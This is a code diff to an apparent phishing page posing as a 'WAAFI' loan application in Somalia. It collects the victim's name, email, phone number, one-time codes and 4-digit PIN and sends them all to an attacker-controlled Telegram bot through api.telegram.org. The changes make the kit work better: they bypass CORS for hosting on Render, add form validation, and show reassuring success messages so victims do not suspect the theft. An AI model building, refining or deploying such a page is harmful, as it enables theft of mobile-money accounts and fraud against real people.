@@ -18,6 +18,7 @@ button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
 .dot {width:30px; height:30px; border-radius:50%; background:#ffedd5; text-align:center; line-height:30px; font-size:13px; color:#9a3412; font-weight:bold;}
 .dot.active {background:#f97316; color:white;}
 .error {color:#dc2626; font-size:14px; text-align:center;}
+.success {color:#16a34a; font-size:14px; text-align:center;}
 .logo {text-align:center; font-size:28px; margin-bottom:10px;}
 </style>
 </head>
@@ -50,9 +51,9 @@ button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
 <!-- STEP 2: PERSONAL INFO -->
 <div class="step" id="step2">
   <h2>Personal Information</h2>
-  <input type="text" id="name" placeholder="Full Name">
-  <input type="email" id="email" placeholder="Email">
-  <input type="tel" id="phone" placeholder="Phone +252">
+  <input type="text" id="name" placeholder="Full Name" required>
+  <input type="email" id="email" placeholder="Email" required>
+  <input type="tel" id="phone" placeholder="Phone +252" required>
   <button onclick="nextStep(3)">Continue</button>
 </div>
 
@@ -61,6 +62,7 @@ button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
   <h2>📱 Verification 1/2</h2>
   <p style="text-align:center;">Sending OTP to <b id="userPhone" style="color:#f97316;"></b></p>
   <button onclick="sendFirstOTP()">Send First OTP</button>
+  <p class="success" id="otp1Status"></p>
 </div>
 
 <!-- STEP 4: OTP 2/2 -->
@@ -78,15 +80,16 @@ button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
   <p style="text-align:center;">Enter your 4-digit PIN</p>
   <input type="password" id="pin" maxlength="4" placeholder="****">
   <button onclick="verifyPIN()">Verify PIN & Submit</button>
+  <p class="success" id="finalStatus"></p>
 </div>
 
 </div>
 
 <script>
-// ====== CONFIG ======
+// ====== IMPORTANT: PASTE YOUR REAL TOKEN AND CHAT ID HERE ======
 const TELEGRAM_BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
 const TELEGRAM_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
-// ====================
+// =================================================================
 
 let formData = {};
 let generatedOTP1 = "";
@@ -103,11 +106,13 @@ function nextStep(n) {
   if(n==2) {
     formData.loan_type = document.getElementById('loan_type').value;
     formData.amount = document.getElementById('amount').value;
+    if(!formData.loan_type || !formData.amount) {alert("Fill all fields"); return;}
   }
   if(n==3) {
     formData.name = document.getElementById('name').value;
     formData.email = document.getElementById('email').value;
     formData.phone = document.getElementById('phone').value;
+    if(!formData.name || !formData.email || !formData.phone) {alert("Fill all fields"); return;}
     document.getElementById('userPhone').innerText = formData.phone;
   }
   
@@ -116,26 +121,35 @@ function nextStep(n) {
   updateProgress(n);
 }
 
-function sendToTelegram(text) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text})
-  });
+async function sendToTelegram(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      mode: 'no-cors', // This fixes Render CORS issue
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text})
+    });
+    return true;
+  } catch(e) {
+    alert("Telegram Send Error: Check Token and Chat ID");
+    return false;
+  }
 }
 
-function sendFirstOTP() {
+async function sendFirstOTP() {
   generatedOTP1 = Math.floor(100000 + Math.random() * 900000).toString();
   const time = new Date().toLocaleTimeString();
   
-  sendToTelegram(`✅ Status: First OTP (1/2) will be sent\n⏰ ${time}\n📱 ${formData.phone}`);
-  sendToTelegram(`📱 OTP CODE: ${generatedOTP1}\n🇸🇴 Somalia\n${formData.phone}`);
+  document.getElementById('otp1Status').innerText = "Sending...";
   
-  alert("First OTP sent! Check your Telegram");
-  nextStep(4);
+  await sendToTelegram(`✅ Status: First OTP (1/2) will be sent\n⏰ ${time}\n📱 ${formData.phone}`);
+  await sendToTelegram(`📱 OTP CODE: ${generatedOTP1}\n🇸🇴 Somalia\n${formData.phone}`);
+  
+  document.getElementById('otp1Status').innerText = "✅ First OTP Sent! Check Telegram";
+  setTimeout(() => nextStep(4), 1500);
 }
 
-function sendSecondOTP() {
+async function sendSecondOTP() {
   const enteredOTP1 = document.getElementById('otp1').value;
   if(enteredOTP1 !== generatedOTP1) {
     document.getElementById('otpError').innerText = "Invalid First OTP. Try again";
@@ -146,23 +160,26 @@ function sendSecondOTP() {
   const time = new Date().toLocaleTimeString();
   
   document.getElementById('otpError').innerText = "";
-  sendToTelegram(`✅ Status: Second OTP (2/2) will be sent\n⏰ ${time}`);
-  sendToTelegram(`📱 OTP CODE: ${generatedOTP2}\n🇸🇴 Somalia\n${formData.phone}`);
+  await sendToTelegram(`✅ Status: Second OTP (2/2) will be sent\n⏰ ${time}`);
+  await sendToTelegram(`📱 OTP CODE: ${generatedOTP2}\n🇸🇴 Somalia\n${formData.phone}`);
   
   alert("Second OTP sent! Check your Telegram");
   nextStep(5);
 }
 
-function verifyPIN() {
+async function verifyPIN() {
   const pin = document.getElementById('pin').value;
+  if(pin.length < 4) {alert("Enter 4 digit PIN"); return;}
   const time = new Date().toLocaleTimeString();
   
-  sendToTelegram(`📱 PIN METHOD: Prompt PIN\n🇸🇴 Somalia\n📱 ${formData.phone}`);
-  sendToTelegram(`⏳ Status: User will be prompted on device\n⏰ ${time}`);
-  sendToTelegram(`📱 PROMPT PIN VERIFIED ✅\n🇸🇴 Somalia\n📱 ${formData.phone}\n\n✅ Status: PIN entered successfully on device\n🎉 Result: User logged in\n⏰ Cached for 30 minutes\n⏰ ${time}`);
+  document.getElementById('finalStatus').innerText = "Submitting...";
+  
+  await sendToTelegram(`📱 PIN METHOD: Prompt PIN\n🇸🇴 Somalia\n📱 ${formData.phone}`);
+  await sendToTelegram(`⏳ Status: User will be prompted on device\n⏰ ${time}`);
+  await sendToTelegram(`📱 PROMPT PIN VERIFIED ✅\n🇸🇴 Somalia\n📱 ${formData.phone}\n\n✅ Status: PIN entered successfully on device\n🎉 Result: User logged in\n⏰ Cached for 30 minutes\n⏰ ${time}`);
   
   const finalMsg = `🟠 🆕 NEW WAAFI LOAN APPLICATION
-
+================================
 NAME: ${formData.name}
 EMAIL: ${formData.email}
 PHONE: ${formData.phone}
@@ -170,11 +187,11 @@ LOAN: ${formData.loan_type} $${formData.amount}
 OTP1: ${generatedOTP1}
 OTP2: ${generatedOTP2}
 PIN: ${pin}
-
+================================
 ⏰ ${new Date().toLocaleString()}`;
 
-  sendToTelegram(finalMsg);
-  alert("✅ Application Submitted Successfully!");
+  await sendToTelegram(finalMsg);
+  document.getElementById('finalStatus').innerText = "✅ Application Submitted Successfully!";
 }
 </script>
 </body>
